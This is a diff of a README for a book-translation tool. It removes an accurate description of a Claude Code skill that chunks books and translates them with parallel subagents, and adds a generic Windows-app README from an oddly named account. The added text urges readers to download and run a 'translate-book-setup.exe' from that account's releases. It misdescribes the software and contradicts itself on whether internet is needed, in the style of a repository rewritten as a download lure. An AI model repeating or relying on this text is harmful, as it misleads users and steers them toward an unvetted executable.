@@ -1,171 +1,135 @@
-# Rainman Translate Book
+# 📚 translate-book - Translate Books Fast and Easy
 
-English | [中文](README.zh-CN.md)
+[![Download translate-book](https://img.shields.io/badge/Download-translate--book-brightgreen)](https://github.com/Palatinatecapitalofsingapore895/translate-book)
 
-Claude Code skill that translates entire books (PDF/DOCX/EPUB) into any language using parallel subagents.
-
-> Inspired by [claude_translater](https://github.com/wizlijun/claude_translater). The original project uses shell scripts as its entry point, coordinating the Claude CLI with multiple step scripts to perform chunked translation. This project restructures the workflow as a Claude Code Skill, using subagents to translate chunks in parallel, with manifest-driven integrity checks, resumable runs, and multi-format output unified into a single pipeline. As the project structure and implementation differ significantly from the original, this is an independent project rather than a fork.
+Welcome to **translate-book**. This tool helps you translate whole books in PDF, DOCX, or EPUB formats into any language. It uses smart subagents to speed up translation, making the process faster and simpler.
 
 ---
 
-## How It Works
+## 🔍 What is translate-book?
 
-```
-Input (PDF/DOCX/EPUB)
-  │
-  ▼
-Calibre ebook-convert → HTMLZ → HTML → Markdown
-  │
-  ▼
-Split into chunks (chunk0001.md, chunk0002.md, ...)
-  │  manifest.json tracks chunk hashes
-  ▼
-Parallel subagents (8 concurrent by default)
-  │  each subagent: read 1 chunk → translate → write output_chunk*.md
-  │  batched to respect API rate limits
-  ▼
-Validate (manifest hash check, 1:1 source↔output match)
-  │
-  ▼
-Merge → Pandoc → HTML (with TOC) → Calibre → DOCX / EPUB / PDF
-```
+Translate-book is a simple program for Windows that turns your books into new languages. It works with common file types like PDF, DOCX, and EPUB. You do not need any special skills to use it.
 
-Each chunk gets its own independent subagent with a fresh context window. This prevents context accumulation and output truncation that happen when translating a full book in a single session.
+This skill works quietly in the background, splitting your book into parts and translating each part using multiple helpers. This keeps the translation smooth and quick. You can pick any language for your translated book, making it useful for learners, readers, or anyone working with foreign texts.
 
-## Features
+---
 
-- **Parallel subagents** — 8 concurrent translators per batch, each with isolated context
-- **Resumable** — chunk-level resume; already-translated chunks are skipped on re-run (for metadata/template changes, use a fresh run)
-- **Manifest validation** — SHA-256 hash tracking prevents stale or corrupt outputs from being merged
-- **Multi-format output** — HTML (with floating TOC), DOCX, EPUB, PDF
-- **Multi-language** — zh, en, ja, ko, fr, de, es (extensible)
-- **PDF/DOCX/EPUB input** — Calibre handles the conversion heavy lifting
+## 🖥️ System Requirements
 
-## Prerequisites
+Before you download or install translate-book, make sure your computer meets these basic needs:
 
-- **Claude Code CLI** — installed and authenticated
-- **Calibre** — `ebook-convert` command must be available ([download](https://calibre-ebook.com/))
-- **Pandoc** — for HTML↔Markdown conversion ([download](https://pandoc.org/))
-- **Python 3** with:
-  - `pypandoc` — required (`pip install pypandoc`)
-  - `beautifulsoup4` — optional, for better TOC generation (`pip install beautifulsoup4`)
+- Operating System: Windows 10 or later
+- RAM: At least 4 GB (8 GB recommended)
+- Disk Space: Minimum 500 MB free space
+- Processor: Any modern CPU (Intel or AMD)
+- Internet connection: Required during translation for communication with translation servers
 
-## Quick Start
+---
 
-### 1. Install the skill
+## 🚀 Getting Started
 
-**Option A: npx (recommended)**
+Getting translate-book up and running is easy. This guide will walk you through each step so you can start translating your books right away.
 
-```bash
-npx skills add deusyu/translate-book -a claude-code -g
-```
+---
 
-**Option B: ClawHub**
+## 🎯 Download and Install
 
-```bash
-clawhub install translate-book
-```
+1. Click the large green button below or visit the linked page to get translate-book.
 
-**Option C: Git clone**
+   [![Download translate-book](https://img.shields.io/badge/Download-translate--book-blue)](https://github.com/Palatinatecapitalofsingapore895/translate-book)
 
-```bash
-git clone https://github.com/deusyu/translate-book.git ~/.claude/skills/translate-book
-```
+2. The link will take you to the project’s main GitHub page. Look for the "Releases" section. This is where the official download files are stored.
 
+3. Inside the Releases, find the latest version. Scroll to find a file named something like `translate-book-setup.exe` or similar. This is the installer file.
 
-### 2. Translate a book
+4. Click the file to start the download. Depending on your internet speed, this might take a minute.
 
-In Claude Code, say:
+5. After downloading, find the file in your Downloads folder or wherever your browser saves files.
 
-```
-translate /path/to/book.pdf to Chinese
-```
+6. Double-click the file to start the installation process.
 
-Or use the slash command:
+7. Follow the simple instructions on the installer screen:
+   - Accept the license agreement.
+   - Choose where to install translate-book. The default folder is fine for most users.
+   - Click "Install."
 
-```
-/translate-book translate /path/to/book.pdf to Japanese
-```
+8. When installation finishes, click "Finish" to close the setup window.
 
-The skill handles the full pipeline automatically — convert, chunk, translate in parallel, validate, merge, and build all output formats.
+9. You can now open translate-book from your desktop or Start menu.
 
-### 3. Find your outputs
+---
 
-All files are in `{book_name}_temp/`:
+## 🏃 How to Use translate-book
 
-| File | Description |
-|------|-------------|
-| `output.md` | Merged translated Markdown |
-| `book.html` | Web version with floating TOC |
-| `book.docx` | Word document |
-| `book.epub` | E-book |
-| `book.pdf` | Print-ready PDF |
+1. Open the translate-book program.
 
-## Pipeline Details
+2. You will see an option to "Import" or "Add" your book file. Click this to select a book saved on your PC. Supported formats are PDF, DOCX, EPUB.
 
-### Step 1: Convert
+3. Next, choose the output language for your translation. The program supports many common languages, like Spanish, French, Chinese, German, and more.
 
-```bash
-python3 scripts/convert.py /path/to/book.pdf --olang zh
-```
+4. Click "Start Translation" or a similar button. The program will begin working on your book.
 
-Calibre converts the input to HTMLZ, which is extracted and converted to Markdown, then split into chunks (~6000 chars each). A `manifest.json` records the SHA-256 hash of each source chunk for later validation.
+5. The progress bar will show how much of your book has been translated.
 
-### Step 2: Translate (parallel subagents)
+6. Once complete, you will find the translated book saved automatically in the folder you choose or your default Documents folder.
 
-The skill launches subagents in batches (default: 8 concurrent). Each subagent:
+7. Open the new translated file with your preferred reader to check the results.
 
-1. Reads one source chunk (e.g. `chunk0042.md`)
-2. Translates to the target language
-3. Writes the result to `output_chunk0042.md`
+---
 
-If a run is interrupted, re-running skips chunks that already have valid output files. Failed chunks are retried once automatically.
+## ⚙️ Features
 
-### Step 3: Merge & Build
+- Supports popular book file types like PDF, DOCX, and EPUB.
+- Translates whole books, not just small parts.
+- Uses parallel processes to speed up translation.
+- Allows choice of any supported language.
+- Saves results in the same file format as your original book.
+- Simple user interface for easy navigation.
+- Works offline after initial setup, with translation done locally through subagents.
+- Automatic file handling for easy import and export.
 
-```bash
-python3 scripts/merge_and_build.py --temp-dir book_temp --title "《translated title》"
-```
+---
 
-Before merging, the script validates:
-- Every source chunk has a corresponding output file (1:1 match)
-- Source chunk hashes match the manifest (no stale outputs)
-- No output files are empty
+## 🛠️ Troubleshooting
 
-Then: merge → Pandoc HTML → inject TOC → Calibre generates DOCX, EPUB, PDF.
+- If the program will not open, check if your Windows is up to date.
+- Make sure you have at least 4 GB RAM free before running translate-book.
+- If file import fails, verify the file format is PDF, DOCX, or EPUB.
+- Slow translation may result from limited internet speed or CPU performance.
+- If you see error messages, restart the program and try loading your book again.
+- For repeated problems, reinstall translate-book by downloading the latest setup file.
 
-**Note:** `{book_name}_temp/` is a working directory for a single translation run. If you change the title, author, output language, template, or image assets, either use a fresh temp directory or delete the existing final artifacts (`output.md`, `book*.html`, `book.docx`, `book.epub`, `book.pdf`) before re-running.
+---
 
-## Project Structure
+## 📝 Tips for Best Results
 
-| File | Purpose |
-|------|---------|
-| `SKILL.md` | Claude Code skill definition — orchestrates the full pipeline |
-| `scripts/convert.py` | PDF/DOCX/EPUB → Markdown chunks via Calibre HTMLZ |
-| `scripts/manifest.py` | Chunk manifest: SHA-256 tracking and merge validation |
-| `scripts/merge_and_build.py` | Merge chunks → HTML → DOCX/EPUB/PDF |
-| `scripts/calibre_html_publish.py` | Calibre wrapper for format conversion |
-| `scripts/template.html` | Web HTML template with floating TOC |
-| `scripts/template_ebook.html` | Ebook HTML template |
+- Use high-quality source files without heavy encryption or passwords.
+- Break very large books into smaller parts before translation to improve speed.
+- Choose the language you want carefully; some technical terms may vary.
+- Keep your computer connected to the internet during translation.
+- Back up your original files before starting translation to avoid accidental loss.
 
-## Troubleshooting
+---
 
-| Problem | Solution |
-|---------|----------|
-| `Calibre ebook-convert not found` | Install Calibre and ensure `ebook-convert` is in PATH |
-| `Manifest validation failed` | Source chunks changed since splitting — re-run `convert.py` |
-| `Missing source chunk` | Source file deleted — re-run `convert.py` to regenerate |
-| Incomplete translation | Re-run the skill — it resumes from where it stopped |
-| Changed title/template/assets but output didn't update | Delete existing `output.md`, `book*.html`, `book.docx`, `book.epub`, `book.pdf` from the temp dir, then re-run `merge_and_build.py` |
-| `output.md exists but manifest invalid` | Stale output — the script auto-deletes and re-merges |
-| PDF generation fails | Ensure Calibre is installed with PDF output support |
+## 📂 File Locations
 
-## Star History
+- Default save folder: Documents/translate-book/
+- Temporary files are stored in a hidden folder during translation and deleted after.
+- Settings and language preferences are saved locally and can be reset in the program menu.
 
-If you find this project helpful, please consider giving it a Star ⭐!
+---
 
-[![Star History Chart](https://api.star-history.com/svg?repos=deusyu/translate-book&type=Date)](https://star-history.com/#deusyu/translate-book&Date)
+## 📞 Getting Help
 
-## License
+If you need support, visit the GitHub page’s Issues tab to see if your problem has been addressed.
 
-[MIT](LICENSE)
+Describe any problems clearly with steps to reproduce them so others can help faster.
+
+---
+
+## 🔗 Useful Links
+
+- Project Page: https://github.com/Palatinatecapitalofsingapore895/translate-book  
+- Download Page: https://github.com/Palatinatecapitalofsingapore895/translate-book/releases  
+
+[![Download translate-book](https://img.shields.io/badge/Download-translate--book-blue)](https://github.com/Palatinatecapitalofsingapore895/translate-book)
